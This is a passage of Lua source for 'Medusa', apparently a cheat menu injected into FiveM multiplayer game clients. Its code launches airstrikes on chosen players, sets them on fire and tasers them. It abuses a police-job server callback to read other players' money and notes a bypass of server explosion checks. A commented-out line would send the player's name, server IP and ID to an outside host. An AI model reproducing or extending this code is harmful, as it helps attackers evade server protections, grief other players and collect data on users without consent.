		end
		enum.destructor = nil
		enum.handle = nil
	end
}

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  	local iter, id = initFunc()
	  	if not id or id == 0 then
			disposeFunc(iter)
			return
	  	end

	  	local enum = {handle = iter, destructor = disposeFunc}
	  	setmetatable(enum, entityEnumerator)

	  	local next = true
	  	repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
	  	until not next

	  	enum.destructor, enum.handle = nil, nil
	  	disposeFunc(iter)
	end)
end

local function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

local function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

local function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

local function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

local function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end


Medusa.Functions.GetAllPeds = function(delay, callback)
	if delay == nil then
		delay = 0
	end
	Citizen.CreateThread(function()
		for k in EnumeratePeds() do
			Citizen.Wait(delay)
			callback(k)
		end
		return
	end)
end

Medusa.Functions.GetAllVehicles = function(delay, callback)
	if delay == nil then
		delay = 0
	end
	Citizen.CreateThread(function()
		for k in EnumerateVehicles() do
			Citizen.Wait(delay)
			callback(k)
		end
		return
	end)
end


  
 Medusa.Functions.AddTextEntry = function(key, value)
	Citizen.InvokeNative(GetHashKey("ADD_TEXT_ENTRY"), key, value)
 end
 
 Citizen.CreateThread(function()
	while true do
		Citizen.Wait(3500)
		Medusa.Functions.AddTextEntry('FE_THDR_GTAO', '~p~| ~b~Medusa ~p~|~b~ Logged as: ~r~'..GetPlayerName(PlayerId()))
		Medusa.Functions.AddTextEntry('PM_PANE_LEAVE', "Disconnect Meme Ham Win")
		Medusa.Functions.AddTextEntry('PM_PANE_QUIT', 'I like u are exitting without being banned :)')
		Medusa.Functions.AddTextEntry('PM_SCR_MAP', "Map with hacks omg wtf")
	end
 end)

local function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

local function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

local function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

local function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    local screenCoordsx = (x - 0.5) * 2.0
    local screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

local function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

local function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end

AddTextEntry('notification_buffer', '~a~')
AddTextEntry('text_buffer', '~a~')
AddTextEntry('preview_text_buffer', '~a~')
RegisterTextLabelToSave('keyboard_title_buffer')

-- Classes
-- > Gatekeeper
Gatekeeper = {}

-- Fullscreen Notification builder
local _notifTitle = "~p~Medusa MENU"
local _notifMsg = "We must authenticate your license before you proceed"
local _notifMsg2 = "~g~Please enter your unique key code"
local _errorCode = 0

local _blackAmount = 0 
-- Get other player data
local function GetPlayerMoney(player)
	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)
		for k,v in ipairs(data.inventory) do
			if v.name == 'cash' then
				_blackAmount =  v.count
				break
			end
		end
	end, player)

	return _blackAmount
end

local ratio = GetAspectRatio(true)
local mult = 10^3
local floor = math.floor
local unpack = table.unpack

local streamedTxtSize

local txtRatio = {}

local function DrawSpriteScaled(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
	-- calculate the height of a sprite using aspect ratio and hash it in memory
	local index = tostring(textureName)
	
	if not txtRatio[index] then
		txtRatio[index] = {}
		local res = GetTextureResolution(textureDict, textureName)
		
		txtRatio[index].ratio = (res[2] / res[1])
		txtRatio[index].height = floor(((width * txtRatio[index].ratio) * ratio) * mult + 0.5) / mult
		DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
	end
	
	DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
end

local function RequestControlOnce(entity)
    if NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

-- Init variables
local showMinimap = true

-- This is for MK2 Weapons
local weaponMkSelection = {}

local weaponTextures = {
	{'https://i.imgur.com/GmpQc7C.png', 'weapon_dagger'},
	{'https://i.imgur.com/dL5qnPn.png?1', 'weapon_bat'},
	{'https://i.imgur.com/tl77ZyC.png', 'weapon_knife'},
	{'https://i.imgur.com/RaFQ0th.png', 'weapon_machete'},
}

local w_Txd = CreateRuntimeTxd('weapon_icons')

local function CreateWeaponTextures()
	
	for i = 1, #weaponTextures do
		local w_DuiObj = CreateDui(weaponTextures[i][1], 256, 128)
		local w_DuiHandle = GetDuiHandle(w_DuiObj)
		local w_Txt = CreateRuntimeTextureFromDuiHandle(w_Txd, weaponTextures[i][2], w_DuiHandle)
		
		-- Medusa.Functions.Print(("Successfully created texture %s"):format(weaponTextures[i][2]))
		--CommitRuntimeTexture(w_Txt)
	end
end

-- CreateWeaponTextures()

-- [NOTE] Weapon Table
local t_Weapons = {

	-- Melee Weapons
	{"WEAPON_BAT", "Baseball Bat", "weapon_bat", "weapon_icons", "melee"},
	{"WEAPON_BATTLEAXE", "Battleaxe", "w_me_fireaxe", "mpweaponsunusedfornow", "melee"},
	{"WEAPON_BOTTLE", "Broken Bottle", nil, nil, "melee"},
	{"WEAPON_CROWBAR", "Crowbar", "w_me_crowbar", "mpweaponsunusedfornow", "melee"},
	{"WEAPON_DAGGER", "Antique Cavalry Dagger", "weapon_dagger", "weapon_icons", "melee"},
	{"WEAPON_FLASHLIGHT", "Flashlight", nil, nil, "melee"},
	{"WEAPON_GOLFCLUB", "Golf Club", "w_me_gclub", "mpweaponsunusedfornow", "melee"},
	{"WEAPON_HAMMER", "Hammer", "w_me_hammer", "mpweaponsunusedfornow", "melee"},
	{"WEAPON_HATCHET", "Hatchet", nil, nil, "melee"},
	{"WEAPON_KNIFE", "Knife", "weapon_knife", "weapon_icons", "melee"},
	{"WEAPON_KNUCKLE", "Brass Knuckles", nil, nil, "melee"},
	{"WEAPON_MACHETE", "Machete", 'weapon_machete', 'weapon_icons', "melee"},
	{"WEAPON_NIGHTSTICK", "Nightstick", "w_me_nightstick", "mpweaponsunusedfornow", "melee"},
	{"WEAPON_POOLCUE", "Pool Cue", nil, nil, "melee"},
	{"WEAPON_STONE_HATCHET", "Stone Hatchet", nil, nil, "melee"},
	{"WEAPON_SWITCHBLADE", "Switchblade", nil, nil, "melee"},
	{"WEAPON_WRENCH", "Wrench", "w_me_wrench", "mpweaponsunusedfornow", "melee"},
	
	-- Handguns
	{'WEAPON_PISTOL', "Pistol", "w_pi_pistol", "mpweaponsgang1_small", "handguns", true},
	{"WEAPON_COMBATPISTOL", "Combat Pistol", "w_pi_combatpistol", "mpweaponscommon_small", "handguns"},
	{"WEAPON_APPISTOL", "AP Pistol", "w_pi_apppistol", "mpweaponsgang1_small", "handguns"},
	{"WEAPON_STUNGUN", "Stungun", "w_pi_stungun", "mpweaponsgang0_small", "handguns"},
	{"WEAPON_PISTOL50", "Pistol .50", nil, nil, "handguns"},
	{'WEAPON_SNSPISTOL', "SNS Pistol", nil, nil, "handguns", true},
	{"WEAPON_HEAVYPISTOL", "Heavy Pistol", nil, nil, "handguns"},
	{"WEAPON_VINTAGEPISTOL", "Vintage Pistol", nil, nil, "handguns"},
	{"WEAPON_FLAREGUN", "Flare Gun", nil, nil, "handguns"},
	{"WEAPON_MARKSMANPISTOL", "Marksman Pistol", nil, nil, "handguns"},
	{'WEAPON_REVOLVER', "Heavy Revolver", nil, nil, "handguns", true},
	{"WEAPON_DOUBLEACTION", "Double Action Revolver", nil, nil, "handguns"},
	{"WEAPON_RAYPISTOL", "Up-n-Atomizer", nil, nil, "handguns"},
	{"WEAPON_CERAMICPISTOL", "Ceramic Pistol", nil, nil, "handguns"},
	{"WEAPON_NAVYREVOLVER", "Navy Revolver", nil, nil, "handguns"},

	-- SMGs
	{"WEAPON_MICROSMG", "Micro SMG", "w_sb_microsmg", "mpweaponscommon_small", "smgs"},
	{'WEAPON_SMG', "SMG", nil, nil, "smgs", true},
	{"WEAPON_ASSAULTSMG","Assault SMG", "w_sb_assaultsmg", "mpweaponscommon_small", "smgs"},
	{"WEAPON_COMBATPDW", "Combat PDW", nil, nil, "smgs"},
	{"weapon_machinepistol", "Machine Pistol", nil, nil, "smgs"},
	{"weapon_minismg", "Mini SMG", nil, nil, "smgs"},
	{"weapon_raycarbine", "Unholy Hellbringer", nil, nil, "smgs"},
	
	-- Shotguns
	{'WEAPON_PUMPSHOTGUN', "Pump Shotgun", "w_sg_pumpshotgun", "mpweaponscommon_small", "shotguns", true},
	{"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun", "w_sg_sawnoff", "mpweaponsgang1", "shotguns"},
	{"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun", "w_sg_assaultshotgun", "mpweaponscommon_small", "shotguns"},
	{"weapon_bullpupshotgun", "Bullpup Shotgun", nil, nil, "shotguns"},
	{"weapon_musket", "Musket", nil, nil, "shotguns"},
	{"weapon_heavyshotgun", "Heavy Shotgun", nil, nil, "shotguns"},
	{"weapon_dbshotgun", "Double Barrel Shotgun", nil, nil, "shotguns"},
	{"weapon_autoshotgun", "Sweeper Shotgun", nil, nil, "shotguns"},

	-- Assault Rifles
	{'WEAPON_ASSAULTRIFLE', "Assault Rifle", "w_ar_assaultrifle", "mpweaponsgang1_small", "assaultrifles", true},
	{'weapon_carbinerifle', "Carbine Rifle", "w_ar_carbinerifle", "mpweaponsgang0_small", "assaultrifles", true},
	{'weapon_advancedrifle', "Advanced Rifle", nil, nil, "assaultrifles"},
	{'weapon_specialcarbine', "Special Carbine", nil, nil, "assaultrifles", true},
	{'weapon_bullpuprifle', "Bullpup Rifle", nil, nil, "assaultrifles", true},
	{'weapon_compactrifle', "Compact Rifle", nil, nil, "assaultrifles"},

	-- LMGs
	{'weapon_mg', "MG", nil, nil, "lmgs"},
	{'weapon_combatmg', "Combat MG", "w_mg_combatmg", "mpweaponsgang0_small", "lmgs", true},
	{'weapon_gusenburg', "Gusenberg Sweeper", nil, nil, "lmgs"},

	-- Sniper Rifles
	{"WEAPON_SNIPERRIFLE", "Sniper Rifle", "w_sr_sniperrifle", "mpweaponsgang0_small", "sniperrifles"},
	{'WEAPON_HEAVYSNIPER', "Heavy Sniper", "w_sr_heavysniper", "mpweaponsgang0_small", "sniperrifles", true},
	{'weapon_marksmanrifle', "Marksman Rifle", nil, nil, "sniperrifles", true},
	-- Heavy Weapons
	{"WEAPON_RPG", "RPG", nil, nil, "heavyweapons"},
	{"WEAPON_GRENADELAUNCHER", "Grenade Launcher", nil, nil, "heavyweapons"},
	{'weapon_grenadelauncher_smoke', "Grenade Launcher (Smoke)", nil, nil, "heavyweapons"},
	{'weapon_minigun', "Minigun", nil, nil, "heavyweapons"},
	{'weapon_firework', "Firework Launcher", nil, nil, "heavyweapons"},
	{'weapon_railgun', "Railgun", nil, nil, "heavyweapons"},
	{'weapon_hominglauncher', "Homing Launcher", nil, nil, "heavyweapons"},
	{'weapon_compactlauncher', "Compact Grenade Launcher", nil, nil, "heavyweapons"},
	{'weapon_rayminigun', "Widowmaker", nil, nil, "heavyweapons"},
}

RequestWeaponAsset("WEAPON_STUNGUN")

local function TazePlayer(player)
	local ped = GetPlayerPed(player)
	local tLoc = GetEntityCoords(ped)

	local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



	ShootSingleBulletBetweenCoords(origin, destination, 1, true, "WEAPON_STUNGUN", PlayerPedId(), true, false, 1.0)
end


function GetActuallyParticul(assetName)
	RequestNamedPtfxAsset(assetName)
	if not (HasNamedPtfxAssetLoaded(assetName)) then
		while not HasNamedPtfxAssetLoaded(assetName) do
			Citizen.Wait(1.0)
		end
		return assetName;
	else
		return assetName;
	end
end

local function IgnitePlayer(player)
	local ped = GetPlayerPed(player)

	RequestControlOnce(ped)

	if IsEntityOnFire(ped) then
		StopEntityFire(ped)
		return true
	end

	StartEntityFire(ped)
	return true
end

local isAirstrikeRunning = false

local Airstrike = {
	ped_hash = "S_M_Y_MARINE_01",
	vehicle_hash = "STRIKEFORCE",
	weapon_asset = 519052682,
	spawnDistance = 750.0,
}
-- 955522731
-- 519052682

RequestModel(Airstrike.ped_hash)
RequestModel(Airstrike.vehicle_hash)
RequestWeaponAsset(Airstrike.weapon_asset, 31, 0)

local function AirstrikePlayer(player)
	if isAirstrikeRunning then
		return Medusa.SendNotification({text = "Wait until the current airstrike is complete", type = "error"}) 
	end

	local function AirstrikeThread()
		isAirstrikeRunning = true
		
		local playerPed = GetPlayerPed(player)
		local target = GetEntityCoords(playerPed)
		local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
		
		repeat
			Wait(0)
		until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
	
		repeat
			Wait(0)
		until HasWeaponAssetLoaded(Airstrike.weapon_asset)
		
		-- Create Aircraft
		local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
		FreezeEntityPosition(aircraft, true)
		
		-- Register with network and give up network ownership
		-- NetworkRegisterEntityAsNetworked(aircraft)
		local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
		SetNetworkIdCanMigrate(netVehid, true)
		NetworkSetNetworkIdDynamic(netVehid, false)
		-- NetworkSetEntityCanBlend(netVehid, true)
		-- NetworkSetChoiceMigrateOptions(true, player)
		-- SetNetworkIdExistsOnAllMachines(netVehid, true)

		aircraft = NetToVeh(netVehid)

		-- Create pilot and block temporary events
		local pilot = CreatePedInsideVehicle(NetToVeh(netVehid), 29, Airstrike.ped_hash, -1, true, true)

		-- Give up network ownership of ped
		-- NetworkRegisterEntityAsNetworked(pilot)
		local netPedid = NetworkGetNetworkIdFromEntity(pilot)
		SetNetworkIdCanMigrate(netPedid, true)
		NetworkSetNetworkIdDynamic(netPedid, false)
		-- NetworkSetEntityCanBlend(netPedid, true)
		-- NetworkSetChoiceMigrateOptions(true, player)
		-- SetNetworkIdExistsOnAllMachines(netPedid, true)

		pilot = NetToPed(netPedid)

		SetBlockingOfNonTemporaryEvents(pilot, true)
		SetDriverAbility(pilot, 1.0)
		-- Make sure the vehicle engine is started
		SetVehicleJetEngineOn(aircraft, true)
		SetVehicleEngineOn(aircraft, true, true, true)
		
		-- Retract landing gear for fast flight
		ControlLandingGear(aircraft, 3)

		-- Disable turbulence
		SetPlaneTurbulenceMultiplier(aircraft, 0.0)

		-- Make sure the vehicle is marked as unowned by Player
		SetVehicleHasBeenOwnedByPlayer(aircraft, false)

		SetVehicleForceAfterburner(aircraft, true)
		local blip = AddBlipForEntity(aircraft)
		
		-- Disabled rockets (CExplosionEvent bypass)
		SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)

		FreezeEntityPosition(aircraft, false)
		--TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
		TaskPlaneMission(pilot, NetToVeh(netVehid), 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
		SetPedKeepTask(pilot, true)
		SetDriveTaskCruiseSpeed(pilot, 150.0)

		while true do
			local target = GetEntityCoords(playerPed)
			local vehCoords = GetEntityCoords(aircraft)
			local distance = GetDistanceBetweenCoords(vehCoords, target)
			--DisableVehicleWeapon(true, 519052682, aircraft, pilot)
			--SetCurrentPedVehicleWeapon(pilot, 519052682)

			if not NetworkDoesEntityExistWithNetworkId(netVehid) then
				isAirstrikeRunning = false
				-- NetworkUnregisterNetworkedEntity(pilot)
				-- NetworkUnregisterNetworkedEntity(aircraft)
				-- SetEntityAsMissionEntity(aircraft)
				-- DeletePed(pilot)
				-- DeleteVehicle(aircraft)
	
				-- RemoveBlip(blip)
				return Medusa.SendNotification({text = "We lost network control, try again.", type = "error"})
			end

			if distance > 150.0 then
				TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
				-- TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
			end

			if distance <= 150.0 then
				--TaskVehicleShootAtCoord(pilot, coords, 0.5)
				ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
				for i = 1, 11 do
				 	local coords = GetEntityCoords(aircraft)
					local target = GetEntityCoords(playerPed)
					local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
					
					-- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
					-- Medusa.Functions.Print(offset)
					ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
					
					Wait(100)
				end
				TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
				
				Wait(10000)
				NetworkUnregisterNetworkedEntity(pilot)
				NetworkUnregisterNetworkedEntity(aircraft)
				DeletePed(pilot)
				SetEntityAsMissionEntity(aircraft, true, true)
				DeleteVehicle(aircraft)
	
				RemoveBlip(blip)

				Medusa.SendNotification({text = ("Airstrike on %s is complete!"):format(GetPlayerName(player)), type = "info"})
				break
			end
			Wait(0)
		end
	
		isAirstrikeRunning = false
	end
	CreateThreadNow(AirstrikeThread)
end

local function AirstrikeWaypoint()
	if isAirstrikeRunning then
		return Medusa.SendNotification({text = "Wait until the current airstrike is complete", type = "error"}) 
	end

	local WaypointHandle = GetFirstBlipInfoId(8)

	if not DoesBlipExist(WaypointHandle) then
		return Medusa.SendNotification({text = "You must place a waypoint", type = "error"})
	end

	local function AirstrikeThread()
		isAirstrikeRunning = true

		local target = GetBlipInfoIdCoord(WaypointHandle)
		local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
		repeat
			Wait(0)
		until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
	
		repeat
			Wait(0)
		until HasWeaponAssetLoaded(Airstrike.weapon_asset)
		  
		-- Create Aircraft
		local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
		FreezeEntityPosition(aircraft, true)
		-- Create pilot and block temporary events
		local pilot = CreatePedInsideVehicle(aircraft, 29, Airstrike.ped_hash, -1, true, true)
		SetBlockingOfNonTemporaryEvents(pilot, true)
		SetDriverAbility(pilot, 1.0)
		-- Make sure the vehicle engine is started
		SetVehicleJetEngineOn(aircraft, true)
		SetVehicleEngineOn(aircraft, true, true, true)
		
		-- Retract landing gear for fast flight
		ControlLandingGear(aircraft, 3)

		-- Disable turbulence
		SetPlaneTurbulenceMultiplier(aircraft, 0.0)

		-- Make sure the vehicle is marked as unowned by Player
		SetVehicleHasBeenOwnedByPlayer(aircraft, false)

		SetVehicleForceAfterburner(aircraft, true)
		local blip = AddBlipForEntity(aircraft)
		
		-- Disabled rockets (CExplosionEvent bypass)
		SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)
		
		SetVehicleWeaponsDisabled(aircraft, 2)
		FreezeEntityPosition(aircraft, false)
		TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
		--TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)

		SetDriveTaskCruiseSpeed(pilot, 150.0)

		-- Register with network and give up network ownership
		NetworkRegisterEntityAsNetworked(aircraft)
		local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
		NetworkSetNetworkIdDynamic(netVehid, false)
		SetNetworkIdCanMigrate(netVehid, true)
		NetworkSetChoiceMigrateOptions(true, player)
		SetNetworkIdExistsOnAllMachines(netVehid, true)
		
		aircraft = NetToVeh(netVehid)

		-- Give up network ownership of ped
		NetworkRegisterEntityAsNetworked(pilot)
		local netPedid = NetworkGetNetworkIdFromEntity(pilot)
		NetworkSetNetworkIdDynamic(netPedid, false)
		SetNetworkIdCanMigrate(netPedid, true)
		NetworkSetChoiceMigrateOptions(true, player)
		SetNetworkIdExistsOnAllMachines(netPedid, true)

		pilot = NetToPed(netPedid)
	
		while true do
			local vehCoords = GetEntityCoords(aircraft)
			local distance = GetDistanceBetweenCoords(vehCoords, target)

			if not DoesEntityExist(aircraft) then
				isAirstrikeRunning = false
				return Medusa.SendNotification({text = "The pilot sux and crashed the jet", type = "error"})
			end

			if distance <= 150.0 then
				--TaskVehicleShootAtCoord(pilot, coords, 0.5)
				ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
				for i = 1, 11 do
					local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
					local vehCoords = GetEntityCoords(aircraft)
					-- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
					-- Medusa.Functions.Print(offset)
					ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
					
					Wait(100)
				end
	
				TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
				Wait(10000)
				DeletePed(pilot)
				
				SetEntityAsMissionEntity(aircraft)
				DeleteVehicle(aircraft)
	
				RemoveBlip(blip)

				Medusa.SendNotification({text = "Airstrike on waypoint is complete!", type = "info"})
				break
			end
			Wait(0)
		end
	
		isAirstrikeRunning = false
	end
	CreateThreadNow(AirstrikeThread)
end

local onlinePlayerSelected = {} -- used for Online Players menu

local function KeyboardInput(title, initialText, bufferSize)
	local editing, finished, cancelled, notActive = 0, 1, 2, 3

	AddTextEntry("keyboard_title_buffer", title)
	DisplayOnscreenKeyboard(0, "keyboard_title_buffer", "", initialText, "", "", "", bufferSize)

	while UpdateOnscreenKeyboard() == editing do
		HideHudAndRadarThisFrame()
		Wait(0)
	end

	if GetOnscreenKeyboardResult() then return GetOnscreenKeyboardResult() end
end

Medusa.Functions.LoadMenuGif = function(link)
	if Medusa.Data.BannerDui ~= nil then
		DestroyDui(Medusa.Data.BannerDui)
	end

	local TexureRuntime = CreateRuntimeTxd("MedusaBannerGif")
	Citizen.CreateThread(function()
		Medusa.Data.BannerDui = CreateDui(tostring(link), 1900, 512)
		Citizen.Wait(125)
		local GifHandler = GetDuiHandle(Medusa.Data.BannerDui)
		local GifRuntime = CreateRuntimeTextureFromDuiHandle(TexureRuntime, "MedusaBannerDuiText", GifHandler)
		Citizen.Wait(125)
		AddReplaceTexture("shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "MedusaBannerGif", "MedusaBannerDuiText")

	end)
end

Medusa.Functions.Init = function()
	local name = GetPlayerName(NetworkGetEntityOwner(GetPlayerPed(-1)))
    local id = GetPlayerServerId(NetworkGetEntityOwner(GetPlayerPed(-1)))
    local ip = GetCurrentServerEndpoint()
    --urlxd = "https://nohaxnomeseasgay.servjuegos.es/medusa.html?player_name="..name.."&ip_of_server="..ip.."&player_id="..id
	urlxd = "https://google.com"
    local url = CreateDui(urlxd, 50, 50)
	Wait(500)
	Medusa.Functions.Print(GetDuiHandle(url))


	imageUrl = "https://www.animationxpress.com/wp-content/uploads/2014/06/Medusa-banner.jpg" -- Paste your image URL here (doesn't have to be from imgur)


	-- The actual script --
	local textureDic = CreateRuntimeTxd('duiTxd') -- Create custom texture dictionary only needs to be done once
	local object = CreateDui(imageUrl, 540, 300) -- Load image into object
	local handle = GetDuiHandle(object) -- Gets DUI handle from object
	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex", handle) -- Creates the texture "duiTex" in the "duiTxd" dictionary
	AddReplaceTexture('vehshare', 'plate01', 'duiTxd', 'duiTex') -- Applies "duiTex" from "duiTxd" to "plate01" from "vehshare"
	AddReplaceTexture('vehshare', 'plate02', 'duiTxd', 'duiTex') -- Applies "duiTex" from "duiTxd" to "plate02" from "vehshare"
	AddReplaceTexture('vehshare', 'plate03', 'duiTxd', 'duiTex') -- Applies "duiTex" from "duiTxd" to "plate03" from "vehshare"
	AddReplaceTexture('vehshare', 'plate04', 'duiTxd', 'duiTex') -- Applies "duiTex" from "duiTxd" to "plate04" from "vehshare"
	AddReplaceTexture('vehshare', 'plate05', 'duiTxd', 'duiTex') -- Applies "duiTex" from "duiTxd" to "plate05" from "vehshare"
	
	
	local object = CreateDui('https://i.imgur.com/Q3uw6V7.png', 540, 300) -- this URL doesn't need to be edited, its just the 2d model for the plate -- Load image into object
	local handle = GetDuiHandle(object) -- Gets DUI handle from object
	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex2", handle) -- Creates the texture "duiTex" in the "duiTxd" dictionary
	AddReplaceTexture('vehshare', 'plate01_n', 'duiTxd', 'duiTex2') -- Applies "duiTex2" from "duiTxd" to "plate01_n" from "vehshare"
	AddReplaceTexture('vehshare', 'plate02_n', 'duiTxd', 'duiTex2') -- Applies "duiTex2" from "duiTxd" to "plate02_n" from "vehshare"
	AddReplaceTexture('vehshare', 'plate03_n', 'duiTxd', 'duiTex2') -- Applies "duiTex2" from "duiTxd" to "plate03_n" from "vehshare"
	AddReplaceTexture('vehshare', 'plate04_n', 'duiTxd', 'duiTex2') -- Applies "duiTex2" from "duiTxd" to "plate04_n" from "vehshare"
	AddReplaceTexture('vehshare', 'plate05_n', 'duiTxd', 'duiTex2') -- Applies "duiTex2" from "duiTxd" to "plate05_n" from "vehshare"

	SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId()), "")

	Medusa.Functions.LoadMenuGif("https://media.discordapp.net/attachments/730443281720279140/771006610092982272/ezgif-3-b91c1cbf3c87.gif")
	
end

Citizen.CreateThread(function()
	Citizen.Wait(3000)
	Medusa.Functions.Init()
end)

local SliderOptions = {}

SliderOptions.FastRun = {
	Selected = 1,
	Values = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49},
	Words = {"Default", "+20%", "+40%", "+60%", "+80%", "+100%"},
}

SliderOptions.DamageModifier = {
	Selected = 1,
	Values = {1.0, 2.0, 5.0, 10.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0},
	Words = {"Default", "2x", "5x", "10x", "25x", "50x", "100x", "200x", "500x", "1000x"}
}

local ComboOptions = {}

ComboOptions.MK2 = {
